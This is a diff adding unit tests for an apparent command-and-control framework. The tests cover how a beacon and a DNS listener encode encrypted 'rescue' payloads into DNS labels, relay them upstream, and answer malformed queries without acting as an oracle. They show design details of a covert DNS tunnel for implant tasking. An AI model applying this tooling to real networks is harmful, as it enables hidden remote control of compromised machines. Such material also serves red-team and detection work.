@@ -339,8 +339,39 @@ class TestTheBeaconsCopyOfTheFormat(unittest.TestCase):
         self.assertEqual(beacon_mod._RESCUE_STRUCT.format,
                          dns_rescue._STRUCT.format)
         self.assertEqual(beacon_mod._RESCUE_MARKER, dns_rescue.MARKER)
+        from software.c2.listeners import dns as dns_listener
+        self.assertEqual(dns_listener._RESCUE_MARKER, dns_rescue.MARKER)
         self.assertEqual(beacon_mod._RESCUE_VERSION, dns_rescue.VERSION)
         self.assertEqual(beacon_mod._RESCUE_TRANSPORTS, dns_rescue.TRANSPORTS)
+        self.assertEqual(beacon_mod._RESCUE_MAX_PAYLOAD_CHARS,
+                         dns_rescue._MAX_PAYLOAD_CHARS)
+
+    def test_both_sides_refuse_a_payload_too_long_for_two_labels(self):
+        from software.c2 import beacon as beacon_mod
+
+        too_big = base64.b64encode(os.urandom(100)).decode()
+        with self.assertRaises(ValueError):
+            beacon_mod._rescue_to_labels(too_big)
+        with self.assertRaises(ValueError):
+            dns_rescue.to_labels(too_big)
+
+    def test_both_sides_split_an_odd_length_the_same_way(self):
+        # A floor-versus-ceil drift would pass a length-90 comparison and
+        # fail on the wire, so drive an odd one.
+        from software.c2 import beacon as beacon_mod
+
+        found = None
+        for extra in range(0, 12):
+            candidate = _encrypt_like_the_beacon(
+                {"d": base64.b64encode(_a_record() + b"\x00" * extra).decode()})
+            length = len(base64.b32encode(base64.b64decode(candidate))
+                         .decode().rstrip("="))
+            if length % 2:
+                found = candidate
+                break
+        self.assertIsNotNone(found, "no odd-length payload in range")
+        self.assertEqual(beacon_mod._rescue_to_labels(found),
+                         dns_rescue.to_labels(found))
 
 # ── The trigger and the query (Task 3) ──
 
@@ -967,6 +998,137 @@ class TestTheOtherLegsRecordToo(unittest.TestCase):
         self.assertTrue(beacon._rescue_flags & dns_rescue.FLAG_PROXY_FOUND)
         self.assertNotEqual(beacon._leg_status.get("https", (0, 0))[0],
                             dns_rescue.CLASSES["auth_required"])
+
+
+# ── The listener relays it (Task 4) ──
+
+
+class TestTheListenerRelaysARescue(unittest.TestCase):
+    """The one exception to "this transport carries nothing upstream".
+
+    The listener still holds no key: it hands the opaque payload to the
+    same `relay` the SMB and QUIC listeners use and puts the opaque answer
+    in a TXT record.
+    """
+
+    ZONE = "c2.test"
+
+    def setUp(self):
+        from software.c2.listeners.dns import DnsListener
+
+        self.listener = DnsListener(
+            "127.0.0.1", 0, relay_url="http://127.0.0.1:1",
+            zone=self.ZONE, listener_token="t")
+        self.agent = "clumsy-raccoon"
+        self.label = (base64.b32encode(self.agent.encode()).decode()
+                      .rstrip("=").lower())
+
+    def _query(self, name):
+        from software.c2 import beacon as beacon_mod
+
+        return beacon_mod._dns_build_query(name, "TXT") \
+            if hasattr(beacon_mod, "_dns_build_query") else None
+
+    def _answer(self, name):
+        """Drive `_answer_for` with a real query for `name`."""
+        import struct as _struct
+
+        qname = b""
+        for part in name.split("."):
+            qname += bytes([len(part)]) + part.encode()
+        qname += b"\x00"
+        query = _struct.pack("!HHHHHH", 0x4242, 0x0100, 1, 0, 0, 0) \
+            + qname + _struct.pack("!HH", 16, 1)
+        return self.listener._answer_for(query)
+
+    def _rescue_name(self, payload_b64=None):
+        from software.c2 import beacon as beacon_mod
+
+        if payload_b64 is None:
+            payload_b64 = _a_ciphertext()
+        one, two = beacon_mod._rescue_to_labels(payload_b64)
+        return "%s.%s.%s.%s.%s" % (one, two, self.label,
+                                   dns_rescue.MARKER, self.ZONE)
+
+    def test_a_rescue_query_is_relayed_and_not_fetched(self):
+        seen = {}
+
+        def relay(payload, *, url, timeout=30.0):
+            seen["payload"] = payload
+            seen["url"] = url
+            return None
+
+        def fetch(*a, **kw):
+            seen["fetched"] = True
+            return None
+
+        cipher = _a_ciphertext()
+        with unittest.mock.patch.multiple(
+                "software.c2.listeners.dns", relay=relay,
+                fetch_tasking=fetch, create=True):
+            self._answer(self._rescue_name(cipher))
+        self.assertEqual(seen.get("payload"), cipher)
+        self.assertEqual(seen["url"], "http://127.0.0.1:1")
+        self.assertNotIn("fetched", seen)
+
+    def test_a_tasking_query_still_fetches_and_does_not_relay(self):
+        seen = {}
+
+        with unittest.mock.patch.multiple(
+                "software.c2.listeners.dns",
+                relay=lambda *a, **kw: seen.setdefault("relayed", True),
+                fetch_tasking=lambda *a, **kw: seen.setdefault("fetched", True)
+                and None,
+                create=True):
+            self._answer("%s.b.%s" % (self.label, self.ZONE))
+        self.assertIn("fetched", seen)
+        self.assertNotIn("relayed", seen)
+
+    def test_the_answer_carries_what_the_relay_returned(self):
+        from software.c2 import beacon as beacon_mod
+
+        task = "opaque-answer-from-the-server"
+        with unittest.mock.patch.multiple(
+                "software.c2.listeners.dns",
+                relay=lambda *a, **kw: task, create=True):
+            answer = self._answer(self._rescue_name())
+        self.assertIsNotNone(answer)
+        self.assertIn(task.encode(), answer)
+
+    def test_a_malformed_payload_answers_exactly_like_an_empty_queue(self):
+        # The oracle question. A listener whose reply differs for a payload
+        # that did not decrypt tells an attacker when a guess was right.
+        from software.c2 import beacon as beacon_mod
+
+        empty = self._answer("%s.b.%s" % (self.label, self.ZONE))
+        bad_names = [
+            "!!!.!!!.%s.%s.%s" % (self.label, dns_rescue.MARKER, self.ZONE),
+            "abc.%s.%s.%s" % (self.label, dns_rescue.MARKER, self.ZONE),
+            "%s.%s.%s" % (self.label, dns_rescue.MARKER, self.ZONE),
+            "aaaa.bbbb.cccc.dddd.%s.%s" % (dns_rescue.MARKER, self.ZONE),
+        ]
+        with unittest.mock.patch.multiple(
+                "software.c2.listeners.dns",
+                relay=lambda *a, **kw: None,
+                fetch_tasking=lambda *a, **kw: None, create=True):
+            for name in bad_names:
+                with self.subTest(name=name[:28]):
+                    got = self._answer(name)
+                    self.assertIsNotNone(got)
+                    # Same shape: a TXT answer with no records. The
+                    # transaction id and the question differ by name, so
+                    # compare the counts, which are what a prober reads.
+                    self.assertEqual(got[6:12], empty[6:12])
+
+    def test_the_listener_never_decrypts_on_the_rescue_path(self):
+        import inspect
+
+        from software.c2.listeners import dns as dns_listener
+
+        source = inspect.getsource(dns_listener)
+        for forbidden in ("_decrypt", "ServerCrypto", "aes", "encryption_key"):
+            with self.subTest(forbidden=forbidden):
+                self.assertNotIn(forbidden, source)
 
 
 if __name__ == "__main__":
